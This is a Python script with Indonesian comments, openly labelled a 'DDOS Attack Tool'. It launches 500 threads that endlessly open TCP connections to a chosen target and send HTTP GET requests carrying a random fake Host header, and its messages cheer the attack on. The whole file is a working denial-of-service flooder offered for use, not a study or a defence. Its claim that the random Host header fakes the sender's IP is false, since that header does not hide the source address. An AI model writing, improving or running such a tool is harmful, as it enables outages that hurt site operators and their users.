import socket
import threading
import random
import time

# Konfigurasi target
target = 'target_ip_atau_domain'  # Ganti sama IP atau domain target
port = 80  # Ganti sama port target (biasanya 80 untuk HTTP)
threads = 500  # Jumlah threads (semakin banyak, semakin ganas)

# Fake IP generator
def fake_ip():
    ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
    return ip

# Fungsi untuk menyerang
def attack():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((target, port))
            sock.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (target, port))
            sock.sendto(("Host: " + fake_ip() + "\r\n\r\n").encode('ascii'), (target, port))
            sock.close()
            print(f"Serangan diluncurkan ke {target}:{port}!")
        except Exception as e:
            print(f"Koneksi gagal: {e}")

# Main function
def main():
    print("=== DDOS Attack Tool ===")
    print(f"Target: {target}")
    print(f"Port: {port}")
    print(f"Threads: {threads}")
    print("=" * 25)
    
    input("Tekan Enter untuk memulai serangan...")
    
    # Mulai threads
    for i in range(threads):
        thread = threading.Thread(target=attack)
        thread.daemon = True
        thread.start()
        print(f"Thread {i+1} started...")

    print(f"\nDDOS attack dimulai dengan {threads} threads! Siap-siap dunia terbakar! 🔥🔥🔥")
    print("Tekan Ctrl+C untuk menghentikan serangan")
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nSerangan dihentikan!")

if __name__ == "__main__":
    main()
